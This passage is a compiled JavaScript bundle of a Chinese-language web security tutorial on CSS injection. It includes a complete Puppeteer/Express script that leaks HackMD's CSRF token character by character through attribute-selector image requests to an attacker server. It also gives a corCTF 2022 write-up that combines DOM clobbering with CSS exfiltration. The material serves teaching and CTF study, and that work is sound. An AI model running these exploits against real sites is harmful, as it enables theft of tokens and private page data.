\u7684\u8a71\uff0c\u5176\u5be6\u4e5f\u505a\u5f97\u5230\uff0c\u53ef\u4ee5\u5229\u7528\u507d\u5143\u7d20\u642d\u914d ",(0,r.kt)("inlineCode",{parentName:"p"},"attr"),"\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-css"},"meta:before {\n    content: attr(content);\n}\n")),(0,r.kt)("p",null,"\u5c31\u6703\u770b\u5230 meta \u88e1\u9762\u7684\u5167\u5bb9\u986f\u793a\u5728\u756b\u9762\u4e0a\u4e86\u3002"),(0,r.kt)("p",null,"\u6700\u5f8c\uff0c\u8b93\u6211\u5011\u4f86\u770b\u4e00\u500b\u5be6\u969b\u6848\u4f8b\u3002"),(0,r.kt)("h2",{id:"\u5077-hackmd-\u7684\u8cc7\u6599"},"\u5077 HackMD \u7684\u8cc7\u6599"),(0,r.kt)("p",null,"HackMD \u7684 CSRF token \u653e\u5728\u5169\u500b\u5730\u65b9\uff0c\u4e00\u500b\u662f hidden input\uff0c\u53e6\u4e00\u500b\u662f meta\uff0c\u5167\u5bb9\u5982\u4e0b\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<meta name="csrf-token" content="h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI">\n')),(0,r.kt)("p",null,"\u800c HackMD \u5176\u5be6\u652f\u63f4 ",(0,r.kt)("inlineCode",{parentName:"p"},"<style>")," \u7684\u4f7f\u7528\uff0c\u9019\u500b\u6a19\u7c64\u4e0d\u6703\u88ab\u904e\u6ffe\u6389\uff0c\u6240\u4ee5\u4f60\u662f\u53ef\u4ee5\u5beb\u4efb\u4f55\u7684 style \u7684\uff0c\u800c\u76f8\u95dc\u7684 CSP \u5982\u4e0b\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"img-src * data:;\nstyle-src 'self' 'unsafe-inline' https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com;\nfont-src 'self' data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com https://script.hotjar.com; \n")),(0,r.kt)("p",null,"\u53ef\u4ee5\u770b\u5230 ",(0,r.kt)("inlineCode",{parentName:"p"},"unsafe-inline")," \u662f\u5141\u8a31\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u63d2\u5165\u4efb\u4f55\u7684 CSS\u3002"),(0,r.kt)("p",null,"\u78ba\u8a8d\u53ef\u4ee5\u63d2\u5165 CSS \u4ee5\u5f8c\uff0c\u5c31\u53ef\u4ee5\u958b\u59cb\u4f86\u6e96\u5099\u5077\u8cc7\u6599\u4e86\u3002\u9084\u8a18\u5f97\u524d\u9762\u6709\u4e00\u500b\u554f\u984c\u6c92\u6709\u56de\u7b54\uff0c\u90a3\u5c31\u662f\u300c\u8a72\u600e\u9ebc\u5077\u7b2c\u4e00\u500b\u4ee5\u5f8c\u7684\u5b57\u5143\uff1f\u300d\uff0c\u6211\u5148\u4ee5 HackMD \u70ba\u4f8b\u56de\u7b54\u3002"),(0,r.kt)("p",null,"\u9996\u5148\uff0cCSRF token \u9019\u7a2e\u6771\u897f\u901a\u5e38\u91cd\u65b0\u6574\u7406\u5c31\u6703\u63db\u4e00\u500b\uff0c\u6240\u4ee5\u4e0d\u80fd\u91cd\u65b0\u6574\u7406\uff0c\u800c HackMD \u525b\u597d\u652f\u63f4\u5373\u6642\u66f4\u65b0\uff0c\u53ea\u8981\u5167\u5bb9\u8b8a\u4e86\uff0c\u6703\u7acb\u523b\u53cd\u6620\u5728\u5176\u4ed6 client \u7684\u756b\u9762\u4e0a\uff0c\u56e0\u6b64\u53ef\u4ee5\u505a\u5230\u300c\u4e0d\u91cd\u65b0\u6574\u7406\u800c\u66f4\u65b0 style\u300d\uff0c\u6d41\u7a0b\u662f\u9019\u6a23\u7684\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"\u6e96\u5099\u597d\u5077\u7b2c\u4e00\u500b\u5b57\u5143\u7684 style\uff0c\u63d2\u5165\u5230 HackMD \u88e1\u9762"),(0,r.kt)("li",{parentName:"ol"},"\u53d7\u5bb3\u8005\u6253\u958b\u9801\u9762"),(0,r.kt)("li",{parentName:"ol"},"\u4f3a\u670d\u5668\u6536\u5230\u7b2c\u4e00\u500b\u5b57\u5143\u7684 request"),(0,r.kt)("li",{parentName:"ol"},"\u5f9e\u4f3a\u670d\u5668\u66f4\u65b0 HackMD \u5167\u5bb9\uff0c\u63db\u6210\u5077\u7b2c\u4e8c\u500b\u5b57\u5143\u7684 payload"),(0,r.kt)("li",{parentName:"ol"},"\u53d7\u5bb3\u8005\u9801\u9762\u5373\u6642\u66f4\u65b0\uff0c\u8f09\u5165\u65b0\u7684 style"),(0,r.kt)("li",{parentName:"ol"},"\u4f3a\u670d\u5668\u6536\u5230\u7b2c\u4e8c\u500b\u5b57\u5143\u7684 request"),(0,r.kt)("li",{parentName:"ol"},"\u4e0d\u65b7\u5faa\u74b0\u76f4\u5230\u5077\u5b8c\u6240\u6709\u5b57\u5143")),(0,r.kt)("p",null,"\u7c21\u55ae\u7684\u793a\u610f\u5716\u5982\u4e0b\uff1a"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"flow",src:t(5628).Z,width:"1070",height:"631"})),(0,r.kt)("p",null,"\u7a0b\u5f0f\u78bc\u5982\u4e0b\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-js"},"const puppeteer = require('puppeteer');\nconst express = require('express')\n\nconst sleep = ms => new Promise(resolve => setTimeout(resolve, ms));\n\n// Create a hackMD document and let anyone can view/edit\nconst noteUrl = 'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf'\nconst host = 'http://localhost:3000'\nconst baseUrl = host + '/extract?q='\nconst port = process.env.PORT || 3000\n\n;(async function() {\n  const app = express()\n  const browser = await puppeteer.launch({\n    headless: true\n  });\n  const page = await browser.newPage();\n  await page.setViewport({ width: 1280, height: 800 })\n  await page.setRequestInterception(true);\n\n  page.on('request', request => {\n    const url = request.url()\n    // cancel request to self\n    if (url.includes(baseUrl)) {\n      request.abort()\n    } else {\n      request.continue()\n    }\n  });\n  app.listen(port, () => {\n    console.log(`Listening at http://localhost:${port}`)\n    console.log('Waiting for server to get ready...')\n    startExploit(app, page)\n  })\n})()\n\nasync function startExploit(app, page) {\n  let currentToken = ''\n  await page.goto(noteUrl + '?edit');\n  \n  // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele\n  await page.addStyleTag({ content: \"{scroll-behavior: auto !important;}\" });\n  const initialPayload = generateCss()\n  await updateCssPayload(page, initialPayload)\n  console.log(`Server is ready, you can open ${noteUrl}?view on the browser`)\n\n  app.get('/extract', (req, res) => {\n    const query = req.query.q\n    if (!query) return res.end()\n\n    console.log(`query: ${query}, progress: ${query.length}/36`)\n    currentToken = query\n    if (query.length === 36) {\n      console.log('over')\n      return\n    }\n    const payload = generateCss(currentToken)\n    updateCssPayload(page, payload)\n    res.end()\n\n  })\n}\n\nasync function updateCssPayload(page, payload) {\n  await sleep(300)\n  await page.click('.CodeMirror-line')\n  await page.keyboard.down('Meta');\n  await page.keyboard.press('A');\n  await page.keyboard.up('Meta');\n  await page.keyboard.press('Backspace');\n  await sleep(300)\n  await page.keyboard.sendCharacter(payload)\n  console.log('Updated css payload, waiting for next request')\n}\n\nfunction generateCss(prefix = \"\") {\n  const csrfTokenChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'.split('')\n  return `\n${prefix}\n<style>\n    head, meta {\n        display: block;\n    }\n    ${\n      csrfTokenChars.map(char => `\n        meta[name=\"csrf-token\"][content^=\"${prefix + char}\"] {\n            background: url(${baseUrl}${prefix + char})\n        }\n      `).join('\\n')\n    }\n</style>\n  `\n}\n")),(0,r.kt)("p",null,"\u53ef\u4ee5\u76f4\u63a5\u7528 Node.js \u8dd1\u8d77\u4f86\uff0c\u8dd1\u8d77\u4f86\u4ee5\u5f8c\u5728\u700f\u89bd\u5668\u6253\u958b\u76f8\u5c0d\u61c9\u7684\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u5728 terminal \u770b\u5230 leak \u7684\u9032\u5ea6\u3002"),(0,r.kt)("p",null,"\u4e0d\u904e\u5462\uff0c\u5c31\u7b97\u5077\u5230\u4e86 HackMD \u7684 CSRF token\uff0c\u4f9d\u7136\u9084\u662f\u6c92\u8fa6\u6cd5 CSRF\uff0c\u56e0\u70ba HackMD \u6709\u5728 server \u6aa2\u67e5\u5176\u4ed6\u7684 HTTP request header \u5982 origin \u6216\u662f referer \u7b49\u7b49\uff0c\u78ba\u4fdd request \u4f86\u81ea\u5408\u6cd5\u7684\u5730\u65b9\u3002"),(0,r.kt)("h2",{id:"css-injection-\u8207\u5176\u4ed6\u6f0f\u6d1e\u7684\u7d44\u5408\u6280"},"CSS injection \u8207\u5176\u4ed6\u6f0f\u6d1e\u7684\u7d44\u5408\u6280"),(0,r.kt)("p",null,"\u5728\u8cc7\u5b89\u7684\u4e16\u754c\u4e2d\uff0c\u5275\u610f\u8ddf\u60f3\u50cf\u529b\u662f\u5f88\u91cd\u8981\u7684\uff0c\u6709\u6642\u5019\u5e7e\u500b\u5c0f\u7684\u6f0f\u6d1e\u4e32\u8d77\u4f86\uff0c\u5c31\u80fd\u63d0\u5347\u56b4\u91cd\u7a0b\u5ea6\u3002\u800c\u9019\u6b21\u8981\u5206\u4eab\u7684\u662f\u4e00\u9053 CTF \u7684\u984c\u76ee\uff0c\u7d50\u5408\u4e86 CSS injection \u8ddf\u53e6\u5916\u4e00\u500b\u6f0f\u6d1e\uff0c\u6211\u89ba\u5f97\u6eff\u6709\u8da3\u7684\u3002"),(0,r.kt)("p",null,(0,r.kt)("img",{src:t(3691).Z,width:"2116",height:"1606"})),(0,r.kt)("p",null,"\u8981\u653b\u64ca\u7684\u5c0d\u8c61\u662f\u4e00\u500b\u7528 React \u5beb\u7684\u90e8\u843d\u683c\u7db2\u7ad9\uff0c\u76ee\u6a19\u5247\u662f\u6210\u529f\u5077\u53d6 ",(0,r.kt)("inlineCode",{parentName:"p"},"/home")," \u9801\u9762\u7684\u8cc7\u6599\u3002\u4f60\u53ef\u4ee5\u65b0\u589e\u6587\u7ae0\uff0c\u800c\u6587\u7ae0\u7684\u5167\u5bb9\u6703\u900f\u904e\u5e95\u4e0b\u7684\u65b9\u5f0f\u6e32\u67d3\u51fa\u4f86\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},"<div dangerouslySetInnerHTML={{ __html: body }}></div>\n")),(0,r.kt)("p",null,"\u4ee5\u524d\u6709\u63d0\u904e\u73fe\u4ee3\u7684\u524d\u7aef\u6846\u67b6\u90fd\u6703\u81ea\u52d5\u628a\u8f38\u51fa\u505a\u7de8\u78bc\uff0c\u4e0d\u7528\u64d4\u5fc3 XSS \u554f\u984c\u3002\u800c ",(0,r.kt)("inlineCode",{parentName:"p"},"dangerouslySetInnerHTML")," \u5728 React \u4e2d\u7684\u610f\u601d\u5c31\u662f\uff1a\u300c\u6c92\u95dc\u4fc2\uff0c\u76f4\u63a5\u8a2d\u7f6e ",(0,r.kt)("inlineCode",{parentName:"p"},"innerHTML")," \u5c31\u597d\u300d\uff0c\u6240\u4ee5\u9019\u908a\u53ef\u4ee5\u63d2\u5165\u4efb\u4f55 HTML\uff0c\u4f46\u554f\u984c\u662f CSP \u898f\u5247\uff1a",(0,r.kt)("inlineCode",{parentName:"p"},"script-src 'self'; object-src 'none'; base-uri 'none';"),"\u3002"),(0,r.kt)("p",null,"\u9019\u500b\u898f\u5247\u662f\u5341\u5206\u56b4\u683c\u7684\uff0c",(0,r.kt)("inlineCode",{parentName:"p"},"script")," \u53ea\u80fd\u5f9e same-origin \u8f09\u5165\uff0c\u800c\u5176\u4ed6\u4f8b\u5982\u8aaa style \u5247\u6c92\u6709\u4efb\u4f55\u9650\u5236\u3002\u5f88\u986f\u7136\u7684\uff0c\u6211\u5011\u53ef\u4ee5\u7528 CSS injection \u5077\u53d6\u9801\u9762\u4e0a\u7684\u8cc7\u6599\u3002"),(0,r.kt)("p",null,"\u53ef\u662f\u53c8\u6709\u4e00\u500b\u554f\u984c\uff0c\u6587\u7ae0\u7684 URL \u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"/posts/:id"),"\uff0c\u800c\u6211\u5011\u8981\u5077\u7684\u8cc7\u6599\u5728 ",(0,r.kt)("inlineCode",{parentName:"p"},"/home"),"\uff0cCSS \u662f\u5f71\u97ff\u4e0d\u5230\u5176\u4ed6\u9801\u9762\u7684\u3002\u5c31\u7b97\u6211\u5011\u53ef\u4ee5\u7528 iframe \u5d4c\u5165 ",(0,r.kt)("inlineCode",{parentName:"p"},"/home")," \u9801\u9762\uff0c\u4e5f\u6c92\u8fa6\u6cd5\u5728\u9019\u9801\u9762\u4e0a\u653e\u5165 style\u3002"),(0,r.kt)("p",null,"\u9019\u8a72\u600e\u9ebc\u8fa6\u5462\uff1f"),(0,r.kt)("p",null,"\u6b64\u6642\u6211\u60f3\u5230\u4e86\u4e00\u62db\uff0c\u90a3\u5c31\u662f iframe \u5143\u7d20\u642d\u914d srcdoc \u53ef\u4ee5\u65b0\u5efa\u4e00\u500b\u9801\u9762\uff0c\u90a3\u6211\u5011\u53ef\u4ee5\u5728\u9019\u500b iframe \u88e1\u9762\u91cd\u65b0\u518d render \u4e00\u6b21 React App\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<iframe srcdoc="\n  <div id=root></div>\n  <script type=module crossorigin src=/assets/index.7352e15a.js><\/script>\n" height="1000px" width="500px"></iframe>\n')),(0,r.kt)("p",null,"\u4e0d\u904e console \u537b\u51fa\u73fe\u4e86\u8207 react-router \u6709\u95dc\u7684\u932f\u8aa4\uff1a"),(0,r.kt)("p",null,(0,r.kt)("img",{src:t(3281).Z,width:"2726",height:"1306"})),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"DOMException: Failed to execute \u2018replaceState\u2019 on \u2018History\u2019: A history state object with URL \u2018about:srcdoc\u2019 cannot be created in a document with origin \u2018http://localhost:8080\u2018 and URL \u2018about:srcdoc\u2019.")),(0,r.kt)("p",null,"react-router \u662f\u4e00\u5957\u62ff\u4f86\u505a\u524d\u7aef\u8def\u7531\u7684\u51fd\u5f0f\u5eab\uff0c\u57fa\u672c\u7684\u7528\u6cd5\u9577\u5f97\u50cf\u9019\u6a23\uff0c\u6703\u5beb\u8aaa\u54ea\u500b\u8def\u5f91\u5c0d\u61c9\u5230\u54ea\u500b\u5143\u4ef6\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-js"},'ReactDOM.createRoot(document.getElementById(\'root\')).render(\n  <React.StrictMode>\n    <ChakraProvider>\n      <BrowserRouter>\n        <Routes>\n          <Route path="/" element={<Index />} />\n          <Route path="/register" element={<Register />} />\n          <Route path="/login" element={<Login />} />\n          <Route path="/home" element={<Home />} />\n          <Route path="/post/:id" element={<Post />} />\n        </Routes>\n      </BrowserRouter>\n    </ChakraProvider>\n  </React.StrictMode>\n);\n')),(0,r.kt)("p",null,"\u4f60\u6709\u6c92\u6709\u597d\u5947\u904e\uff0c\u5b83\u662f\u600e\u9ebc\u6c7a\u5b9a\u73fe\u5728\u7684\u8def\u5f91\u7684\uff1f\u82e5\u662f\u5be6\u969b\u53bb\u770b ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/remix-run/history/blob/dev/packages/history/index.ts#L364"},"createBrowserHistory")," \u7684\u7a0b\u5f0f\u78bc\uff0c\u53ef\u4ee5\u770b\u5230\u5e95\u4e0b\u9019\u6bb5\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-js"},"export function createBrowserHistory(\n  options: BrowserHistoryOptions = {}\n): BrowserHistory {\n  let { window = document.defaultView! } = options;\n  let globalHistory = window.history;\n\n  function getIndexAndLocation(): [number, Location] {\n    let { pathname, search, hash } = window.location;\n    // ...\n  }\n\n  // ...\n}\n")),(0,r.kt)("p",null,"\u5b83\u6700\u5f8c\u662f\u7528 ",(0,r.kt)("inlineCode",{parentName:"p"},"window.location.pathname")," \u6c7a\u5b9a\u7684\uff0c\u800c\u91cd\u9ede\u662f\u9019\u500b ",(0,r.kt)("inlineCode",{parentName:"p"},"window")," \u662f\u5f9e ",(0,r.kt)("inlineCode",{parentName:"p"},"document.defaultView")," \u4f86\u7684\uff0c\u7c21\u800c\u8a00\u4e4b\u5c31\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"document.defaultView.location.pathname")),(0,r.kt)("p",null,"\u9019\u4ee3\u8868\u4ec0\u9ebc\u5462\uff1f\u4ee3\u8868\u6211\u5011\u53ef\u4ee5\u7528 DOM clobbering \u8986\u84cb\u5b83\uff01"),(0,r.kt)("p",null,"\u4e4b\u524d\u8b1b\u5230 DOM clobbering \u6709\u8aaa\u904e\u6211\u5011\u6c92\u8fa6\u6cd5\u8986\u84cb\u5df2\u7d93\u5b58\u5728\u7684 window \u5c6c\u6027\uff0c\u6240\u4ee5\u50cf ",(0,r.kt)("inlineCode",{parentName:"p"},"window.location")," \u5c31\u7121\u6cd5\u84cb\u6389\u3002\u53ef\u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"document")," \u5c31\u4e0d\u4e00\u6a23\u4e86\uff0c\u6211\u5011\u662f\u53ef\u4ee5\u84cb\u6389 ",(0,r.kt)("inlineCode",{parentName:"p"},"document")," \u7684\u3002"),(0,r.kt)("p",null,"\u5982\u679c\u5728\u9801\u9762\u4e0a\u653e\u4e86\u4e00\u500b ",(0,r.kt)("inlineCode",{parentName:"p"},'<iframe name=defaultView src="/home">'),"\uff0c\u90a3 ",(0,r.kt)("inlineCode",{parentName:"p"},"document.defaultView")," \u5c31\u6703\u662f\u9019\u500b iframe \u7684 contentWindow\uff0c\u800c\u9019\u908a\u7684 src \u662f\u540c\u6e90\u7684 ",(0,r.kt)("inlineCode",{parentName:"p"},"/home"),"\uff0c\u6240\u4ee5\u53ef\u4ee5\u5b58\u53d6 ",(0,r.kt)("inlineCode",{parentName:"p"},"document.defaultView.location.pathname"),"\uff0c\u5c31\u62ff\u5230\u4e86 ",(0,r.kt)("inlineCode",{parentName:"p"},"/home")," \u9801\u9762\u7684 pathname\uff0c\u5728 iframe \u88e1\u9762\u6e32\u67d3\u4e86 home \u9801\u9762\u7684\u5167\u5bb9\u3002"),(0,r.kt)("p",null,"\u5982\u6b64\u4e00\u4f86\uff0c\u5c31\u53ef\u4ee5\u8ddf\u524d\u9762\u767c\u73fe\u7684 CSS injection \u505a\u7d50\u5408\uff0c\u7bc4\u4f8b\u5982\u4e0b\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<iframe srcdoc="\n  iframe /home below<br>\n  <iframe name=defaultView src=/home></iframe><br>\n  iframe /home above<br>\n  <style>\n    a[href^="/post/0"] {\n      background: url(//myserver?c=0);\n    }\n\n    a[href^="/post/1"] {\n      background: url(//myserver?c=1);\n    }\n  \n  </style>\n\n  react app below<br>\n  <div id=root></div>\n  <script type=module crossorigin src=/assets/index.7352e15a.js><\/script>\n" height="1000px" width="500px"></iframe>\n')),(0,r.kt)("p",null,"\u4ecb\u9762\u6703\u9577\u9019\u6a23\uff1a"),(0,r.kt)("p",null,(0,r.kt)("img",{src:t(2502).Z,width:"1358",height:"1658"})),(0,r.kt)("p",null,"\u6211\u5011\u5728 iframe \u7684 srcdoc \u88e1\u9762\u91cd\u65b0\u6e32\u67d3\u4e86\u4e00\u500b React app\uff0c\u800c\u4e14\u900f\u904e DOM clobbering \u8b93\u9019\u500b React app \u6e32\u67d3\u4e86\u5225\u7684\u9801\u9762\uff0c\u5c31\u80fd\u5920\u900f\u904e CSS injection \u5077\u53d6\u8cc7\u6599\uff0c\u9054\u6210\u6211\u5011\u7684\u76ee\u7684\u3002"),(0,r.kt)("p",null,"\u672c\u984c\u51fa\u81ea corCTF 2022 \u7684 modernblog\uff0c\u60f3\u770b\u66f4\u591a\u7d30\u7bc0\u53ef\u4ee5\u53c3\u8003\u6211\u4e4b\u524d\u5beb\u7684\u82f1\u6587\u8a73\u89e3\uff1a",(0,r.kt)("a",{parentName:"p",href:"https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/"},"corCTF 2022 writeup - modernblog")),(0,r.kt)("h2",{id:"\u5c0f\u7d50"},"\u5c0f\u7d50"),(0,r.kt)("p",null,"\u5728\u9019\u7bc7\u88e1\u9762\uff0c\u6211\u5011\u770b\u5230\u4e86\u4e4b\u6240\u4ee5\u53ef\u4ee5\u7528 CSS \u4f86\u5077\u8cc7\u6599\u7684\u539f\u7406\uff0c\u8aaa\u7a7f\u4e86\u5c31\u662f\u5229\u7528\u300c\u5c6c\u6027\u9078\u64c7\u5668\u300d\u518d\u52a0\u4e0a\u300c\u8f09\u5165\u5716\u7247\u300d\u9019\u5169\u500b\u7c21\u55ae\u7684\u529f\u80fd\uff0c\u4e5f\u793a\u7bc4\u4e86\u5982\u4f55\u5077\u53d6 hidden input \u8ddf meta \u88e1\u7684\u8cc7\u6599\uff0c\u4e26\u4e14\u4ee5 HackMD\u7576\u4f5c\u5be6\u969b\u6848\u4f8b\u8aaa\u660e\u3002"),(0,r.kt)("p",null,"\u4f46\u662f\u5462\uff0c\u6709\u5e7e\u500b\u554f\u984c\u6211\u5011\u9084\u6c92\u89e3\u6c7a\uff0c\u50cf\u662f\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"HackMD \u56e0\u70ba\u53ef\u4ee5\u5373\u6642\u540c\u6b65\u5167\u5bb9\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u91cd\u65b0\u6574\u7406\u5c31\u53ef\u4ee5\u8f09\u5165\u65b0\u7684 style\uff0c\u90a3\u5176\u4ed6\u7db2\u7ad9\u5462\uff1f\u8a72\u600e\u9ebc\u5077\u5230\u7b2c\u4e8c\u500b\u4ee5\u5f8c\u7684\u5b57\u5143\uff1f"),(0,r.kt)("li",{parentName:"ol"},"\u4e00\u6b21\u53ea\u80fd\u5077\u4e00\u500b\u5b57\u5143\u7684\u8a71\uff0c\u662f\u4e0d\u662f\u8981\u5077\u5f88\u4e45\u5462\uff1f\u9019\u5728\u5be6\u969b\u4e0a\u53ef\u884c\u55ce\uff1f"),(0,r.kt)("li",{parentName:"ol"},"\u6709\u6c92\u6709\u8fa6\u6cd5\u5077\u5230\u5c6c\u6027\u4ee5\u5916\u7684\u6771\u897f\uff1f\u4f8b\u5982\u8aaa\u9801\u9762\u4e0a\u7684\u6587\u5b57\u5167\u5bb9\uff0c\u6216\u751a\u81f3\u662f JavaScript \u7684\u7a0b\u5f0f\u78bc\uff1f"),(0,r.kt)("li",{parentName:"ol"},"\u91dd\u5c0d\u9019\u500b\u653b\u64ca\u624b\u6cd5\u7684\u9632\u79a6\u65b9\u5f0f\u6709\u54ea\u4e9b\uff1f")),(0,r.kt)("p",null,"\u9019\u4e9b\u554f\u984c\uff0c\u6703\u5728\u4e0b\u4e00\u7bc7\u88e1\u9762\u4e00\u4e00\u89e3\u7b54\u3002"))}m.isMDXComponent=!0},5517:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/17-01-e672c8c918766b00f9cb02c77d44e611.png"},9922:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/17-02-338188f1ccf302f5d258845d0b5ea648.png"},9515:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/17-03-1e94a8e7d864cb6811a0ddded7474928.png"},5628:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/17-04-b7784667353c19f3c1e1c275605ee319.png"},3691:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/17-05-2811418ea7b424634a499b6b23ba58ca.png"},3281:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/17-06-e66beb8ef03ff965e7227bf587064d43.png"},2502:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/17-07-e33c5e1715d2f050a31526085e487e61.png"}}]);